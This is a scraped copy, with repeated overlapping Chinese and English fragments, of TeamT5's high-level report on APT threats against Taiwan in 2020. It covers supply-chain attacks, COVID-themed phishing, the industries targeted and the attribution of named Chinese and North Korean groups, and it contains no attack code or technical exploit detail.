族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5

Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend.

族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5

網路攻擊態勢","__v":0,"id":"609899422107530037594a81"},{"locale":"en","_id":"609899422107530037594a82","title":"APT Threat Landscape of Taiwan in 2020","__v":0,"context":"**By TeamT5 CTO Charles Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend.

年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n\u003cbr\u003e\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n\u003cbr\u003e\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5

Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by 